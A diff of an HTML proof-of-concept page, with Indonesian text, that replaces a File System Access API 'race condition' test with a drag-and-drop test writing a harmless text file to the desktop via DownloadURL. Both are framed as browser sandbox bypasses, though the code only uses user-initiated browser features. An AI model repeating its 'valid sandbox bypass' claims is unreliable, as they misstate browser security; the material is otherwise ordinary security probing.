@@ -2,68 +2,68 @@
 <html>
 
 <head>
-    <title>PoC - API Race Condition</title>
+    <title>PoC - DnD Sandbox Bypass</title>
     <style>
         body {
-            background: #1a1a1a;
-            color: #ff00ff;
-            font-family: monospace;
-            text-align: center;
+            background-color: #e3f2fd;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
 
-        #log {
-            white-space: pre;
-            border: 1px solid lime;
-            padding: 10px;
-            width: 80%;
-            margin: auto;
-            text-align: left;
+        #dragTarget {
+            width: 250px;
+            height: 150px;
+            background-color: #1976d2;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border-radius: 15px;
+            cursor: grab;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            user-select: none;
+        }
+
+        #dragTarget:active {
+            cursor: grabbing;
+        }
+
+        .instruction {
+            margin-top: 20px;
+            color: #333;
         }
     </style>
 </head>
 
 <body>
-    <h2>Menguji API Race Condition...</h2>
-    <div id="log">Logs:<br></div>
+
+    <h3>Situs A (Drag and Drop Context)</h3>
+
+    <div id="dragTarget" draggable="true">
+        KLIK & SERET SAYA <br> KE DESKTOP / FOLDER
+    </div>
+
+    <p class="instruction">Tarik kotak biru di atas keluar dari browser ke desktop kamu.</p>
 
     <script>
-        function log(msg) {
-            document.getElementById('log').innerHTML += msg + "<br>";
-            console.log(msg);
-        }
+        const dragTarget = document.getElementById('dragTarget');
 
-        async function triggerRace() {
-            log("API Race Attack Initiated...");
-            if (!('showSaveFilePicker' in window)) {
-                log("FAIL: showSaveFilePicker() tidak didukung.");
-                return;
-            }
-
-            log("Memulai Race Condition...");
-            const payload = "Bypass via File System Access API Race Condition Success!";
-            try {
-                const handle = await window.showSaveFilePicker({
-                    suggestedName: 'sw_pwned.txt'
-                });
-
-                log("API Call Accepted by Browser!");
-                const writable = await handle.createWritable();
-                await writable.write(payload);
-                await writable.close();
-
-                log("SUCCESS: File berhasil ditulis ke disk lewat API!");
-                log("Ini adalah VALID Sandbox Bypass.");
-
-            } catch (e) {
-
-                log("FAILED: " + e.message);
-                if (e.message.includes('Disallowed')) {
-                    log("Sandbox Check Win (API is protected).");
-                }
-            }
-        }
-
-        setTimeout(triggerRace, 2000);
+        dragTarget.addEventListener('dragstart', (e) => {
+            console.log("Drag started - Attempting OS-level escape...");
+            const fileName = "pwned_sandbox.txt";
+            const fileContent = "data:text/plain;base64,U2FuZGJveCBCeXBhc3MgdmlhIERyYWcgYW5kIERyb3AgaXMgU3VjY2VzcyE=";
+            const downloadData = `text/plain:${fileName}:${fileContent}`;
+            e.dataTransfer.setData("DownloadURL", downloadData);
+            e.dataTransfer.setData("text/plain", "Ini hasil bypass sandbox");
+        });
     </script>
 </body>
 
